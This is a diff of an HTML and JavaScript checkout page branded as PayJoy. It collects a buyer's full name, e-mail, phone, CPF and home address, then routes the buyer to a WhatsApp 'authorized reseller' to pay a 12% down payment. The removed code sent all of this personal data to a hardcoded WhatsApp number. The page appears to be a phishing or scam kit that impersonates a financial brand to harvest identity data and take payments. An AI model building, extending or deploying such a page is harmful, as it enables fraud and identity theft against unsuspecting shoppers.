@@ -5,8 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Checkout</title>
 
-<link rel="icon" type="image/png" href="images.png">
-
 <style>
 body {
     margin: 0;
@@ -14,45 +12,44 @@ body {
     background: #f4f4f4;
 }
 
-a { text-decoration: none; color: inherit; }
-
 header {
     background-color: #0b7a3c;
     height: 72px;
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding: 0 14px;
+    padding: 0 16px;
+    color: #fff;
 }
 
 header img { height: 44px; }
 
-.menu {
-    font-size: 28px;
-    color: #fff;
+.seller-name {
+    font-size: 14px;
+    font-weight: bold;
 }
 
 .container {
     background: #fff;
     margin: 12px;
-    padding: 16px;
-    border-radius: 12px;
-    border: 1px solid #e5e5e5;
+    padding: 18px;
+    border-radius: 14px;
 }
 
 .type-select {
     display: flex;
     gap: 10px;
-    margin-bottom: 16px;
+    margin-bottom: 18px;
 }
 
 .type {
     flex: 1;
-    padding: 12px;
+    padding: 14px;
     text-align: center;
-    border-radius: 8px;
+    border-radius: 10px;
     border: 2px solid #0b7a3c;
     font-weight: bold;
+    cursor: pointer;
 }
 
 .type.active {
@@ -62,81 +59,65 @@ header img { height: 44px; }
 
 .product {
     display: flex;
-    gap: 12px;
+    gap: 14px;
     margin-bottom: 16px;
 }
 
 .product img {
-    width: 110px;
-    border-radius: 8px;
-}
-
-.product-info {
-    font-size: 14px;
-}
-
-.product-info strong {
-    color: #0b7a3c;
+    width: 120px;
+    border-radius: 10px;
 }
 
 .field {
-    margin-bottom: 12px;
+    margin-bottom: 14px;
 }
 
 .field label {
+    font-size: 14px;
     display: block;
-    font-size: 13px;
-    margin-bottom: 4px;
+    margin-bottom: 6px;
 }
 
 .field input,
 .field select {
     width: 100%;
-    padding: 10px;
-    border-radius: 6px;
+    padding: 14px;
+    font-size: 16px;
+    border-radius: 10px;
     border: 1px solid #ccc;
-    font-size: 14px;
 }
 
-.total-box {
+.info-box {
     background: #f0fdf4;
-    padding: 12px;
-    border-radius: 8px;
-    border: 1px solid #bbf7d0;
+    padding: 14px;
+    border-radius: 10px;
     margin-bottom: 16px;
     font-size: 14px;
 }
 
 .button {
     width: 100%;
-    padding: 14px;
+    padding: 16px;
     background: #0b7a3c;
     color: #fff;
     border: none;
-    border-radius: 10px;
-    font-size: 16px;
+    border-radius: 12px;
+    font-size: 17px;
     font-weight: bold;
     cursor: pointer;
 }
 
-.toast {
-    position: fixed;
-    bottom: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: #111;
-    color: #fff;
-    padding: 14px 18px;
-    border-radius: 10px;
-    display: none;
-    font-size: 14px;
-    z-index: 999;
+.explain {
+    font-size: 13px;
+    color: #444;
+    margin: 12px 0;
+    text-align: center;
 }
 
 footer {
     background-color: #0b7a3c;
     color: #fff;
-    padding: 24px 0;
+    padding: 22px 0;
     text-align: center;
     margin-top: 16px;
 }
@@ -144,12 +125,12 @@ footer {
 footer span {
     font-size: 12px;
     display: block;
-    margin-top: 10px;
+    margin-top: 8px;
 }
 
-footer .logo {
-    margin-top: 12px;
-    width: 100px;
+footer img {
+    width: 90px;
+    margin-top: 10px;
 }
 </style>
 </head>
@@ -158,110 +139,131 @@ footer .logo {
 
 <header>
   <img src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg">
-  <a href="index.html" class="menu">←</a>
+  <div class="seller-name" id="sellerName"></div>
 </header>
 
 <div class="container">
 
-  <!-- TIPO -->
   <div class="type-select">
     <div class="type active">Sou comprador</div>
     <a href="revender.html" class="type">Sou revendedor</a>
   </div>
 
-  <!-- PRODUTO -->
   <div class="product">
     <img id="prodImg">
-    <div class="product-info">
-      <div id="prodName"></div>
-      <div>Valor total: <strong>R$ <span id="prodPrice"></span></strong></div>
+    <div>
+      <strong id="prodName"></strong><br>
+      Valor total: <strong>R$ <span id="prodPrice"></span></strong>
     </div>
   </div>
 
-  <!-- PARCELAS -->
   <div class="field">
-    <label>Quantidade de parcelas</label>
-    <select id="parcelas">
-      <option value="6">6x</option>
-      <option value="12">12x</option>
-      <option value="18">18x</option>
-      <option value="24">24x</option>
-    </select>
+    <label>Parcelamento</label>
+    <select id="parcelas"></select>
   </div>
 
-  <!-- ENTRADA -->
-  <div class="total-box">
-    Entrada mínima (12%): R$ <strong><span id="entrada"></span></strong><br>
-    Parcelamento negociável com o revendedor.
+  <div class="info-box">
+    Entrada mínima (12%): <strong>R$ <span id="entrada"></span></strong>
   </div>
 
-  <!-- DADOS -->
   <div class="field"><label>Nome completo</label><input id="nome"></div>
   <div class="field"><label>E-mail</label><input id="email"></div>
   <div class="field"><label>Telefone</label><input id="telefone"></div>
   <div class="field"><label>CPF</label><input id="cpf"></div>
-  <div class="field"><label>Interesse</label><input id="interesse"></div>
   <div class="field"><label>CEP</label><input id="cep"></div>
   <div class="field"><label>Rua</label><input id="rua"></div>
-  <div class="field"><label>Número</label><input id="numero"></div>
+
+  <!-- NOVO CAMPO -->
+  <div class="field"><label>Número da residência</label><input id="numero"></div>
+
   <div class="field"><label>Bairro</label><input id="bairro"></div>
 
-  <button class="button" onclick="finalizar()">Finalizar com o revendedor</button>
+  <div class="explain">
+    Ao clicar em <strong>Finalizar no WhatsApp</strong>, você será direcionado para um
+    revendedor autorizado que dará continuidade ao processo de pagamento.
+  </div>
 
-</div>
+  <button class="button" onclick="finalizar()">Finalizar no WhatsApp</button>
 
-<div class="toast" id="toast">
-Estamos redirecionando você para o revendedor no WhatsApp.<br>
-Finalize a compra ou tire suas dúvidas com ele.
 </div>
 
 <footer>
-  <span>© 2026 PayJoy. Todos os direitos reservados.</span>
-  <img class="logo" src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg">
+  <span>© 2026 PayJoy — CNPJ 41.069.116/0001-64</span>
+  <img src="https://6d1ule7j8zutphez.public.blob.vercel-storage.com/logos/green.svg">
 </footer>
 
 <script>
 const params = new URLSearchParams(window.location.search);
-const name = params.get("name");
+const product = params.get("name");
 const price = parseFloat(params.get("price"));
 const img = params.get("img");
+const seller = params.get("seller");
 
-document.getElementById("prodImg").src = img;
-document.getElementById("prodName").innerText = name;
-document.getElementById("prodPrice").innerText = price.toFixed(2).replace(".", ",");
+sellerName.innerText = "Revendedor: " + seller;
+prodName.innerText = product;
+prodPrice.innerText = price.toFixed(2).replace(".", ",");
+prodImg.src = img;
 
 const entrada = price * 0.12;
-document.getElementById("entrada").innerText = entrada.toFixed(2).replace(".", ",");
+entradaSpan = document.getElementById("entrada");
+entradaSpan.innerText = entrada.toFixed(2).replace(".", ",");
 
-function finalizar() {
-  document.getElementById("toast").style.display = "block";
+const parcelasSelect = document.getElementById("parcelas");
+[1,6,12,18,24].forEach(p => {
+  const opt = document.createElement("option");
+  opt.value = p;
+  opt.innerText = `${p}x de R$ ${(price/p).toFixed(2).replace(".", ",")}`;
+  parcelasSelect.appendChild(opt);
+});
 
-  const msg =
-`2848 - Número de atendimento
+cep.onblur = () => {
+  fetch(`https://viacep.com.br/ws/${cep.value}/json`)
+    .then(r => r.json())
+    .then(d => {
+      rua.value = d.logradouro || "";
+      bairro.value = d.bairro || "";
+    });
+};
 
-Produto: ${name}
-Valor total: R$ ${price.toFixed(2)}
+function maskName(name){
+  const first = name.split(" ")[0];
+  return first + "****";
+}
 
-Entrada mínima: R$ ${entrada.toFixed(2)}
-Parcelas: ${document.getElementById("parcelas").value}x
+function maskCPF(cpf){
+  return cpf.substring(0,3) + ".***.***-" + cpf.slice(-2);
+}
 
-Nome: ${nome.value}
-E-mail: ${email.value}
-Telefone: ${telefone.value}
-CPF: ${cpf.value}
+function finalizar(){
 
-Interesse: ${interesse.value}
+  if (
+    !nome.value ||
+    !email.value ||
+    !telefone.value ||
+    !cpf.value ||
+    !cep.value ||
+    !rua.value ||
+    !numero.value ||
+    !bairro.value
+  ) {
+    alert("Por favor, preencha todos os campos para continuar.");
+    return;
+  }
 
-Endereço:
-CEP: ${cep.value}
-Rua: ${rua.value}
-Número: ${numero.value}
-Bairro: ${bairro.value}`;
+  const url =
+`finalizar.html?
+seller=${encodeURIComponent(seller)}
+&buyer=${encodeURIComponent(maskName(nome.value))}
+&cpf=${encodeURIComponent(maskCPF(cpf.value))}
+&email=${encodeURIComponent(email.value)}
+&phone=${encodeURIComponent(telefone.value)}
+&street=${encodeURIComponent(rua.value + ", " + numero.value)}
+&parcelas=${parcelas.value}
+&price=${price}
+&entrada=${entrada.toFixed(2)}
+&product=${encodeURIComponent(product)}`;
 
-  setTimeout(() => {
-    window.location.href =
-    "https://wa.me/558597243058?text=" + encodeURIComponent(msg);
-  }, 2000);
+  window.location.href = url;
 }
 </script>
 
